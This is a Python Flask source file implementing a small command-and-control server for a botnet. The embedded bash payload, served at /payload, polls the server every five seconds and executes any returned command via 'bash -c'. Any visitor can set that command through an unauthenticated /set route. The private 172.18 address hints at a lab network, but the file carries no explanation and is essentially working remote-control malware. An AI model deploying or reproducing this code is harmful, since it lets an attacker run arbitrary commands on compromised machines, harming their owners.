from flask import Flask
app = Flask(__name__)

command = "idle"

# Bot payload script - served at /payload
BOT_LOOP_SCRIPT = '''#!/bin/bash
C2_URL="http://172.18.0.2:9000/cmd"
while true; do
    CMD=$(curl -s $C2_URL)
    if [ "$CMD" != "idle" ] && [ ! -z "$CMD" ]; then
        echo "[BOT] Executing: $CMD"
        bash -c "$CMD"
    fi
    sleep 5
done
'''

@app.route("/cmd")
def get_cmd():
    return command

@app.route("/set/<cmd>")
def set_cmd(cmd):
    global command
    command = cmd
    return "OK"

@app.route("/payload")
def get_payload():
    return BOT_LOOP_SCRIPT

app.run(host="0.0.0.0", port=9000)
